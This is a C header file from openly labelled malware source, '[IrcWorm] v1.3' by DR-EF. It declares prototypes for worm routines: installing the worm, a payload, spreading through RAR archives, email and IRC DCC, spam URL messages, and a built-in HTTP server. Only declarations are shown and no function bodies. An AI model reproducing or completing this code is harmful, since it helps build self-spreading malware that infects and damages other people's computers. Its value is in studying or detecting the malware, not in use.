
/* functions prototypes defination */

#ifndef __Prototypez__

	#define __Prototypez__

	const char CopyRight[]="[IrcWorm] v1.3 (c) 2005 written by DR-EF";

	void GetRndUserStr(char *dst,BOOL numbers);
	HANDLE XThread(LPTHREAD_START_ROUTINE XThread_Function,LPVOID Parameter);
	DWORD WINAPI Ident_Server(LPVOID xvoid);
	BOOL GetNickFromBuffer(char *dst,char xbuffer[]);
	BOOL AddToRar(char RarFile[],char FileToAdd[],char PackedFileName[],DWORD Attributes);
	DWORD WINAPI Http_Server(LPVOID xVoid);
	void GenUrlSpamMessage(char *dst,char userip[]);
	void RandomString(char *dst,int len,BOOL Gen_Numbers);
	DWORD WINAPI RarWorm(LPVOID xvoid);
	void InstallWorm();
	void Payload();
	DWORD WINAPI mailworm(LPVOID xvoid);
	void WaitForInetConnection();
	DWORD WINAPI WormNotify(LPVOID xvoid);
	void GetDccFileName(char *dst);


#endif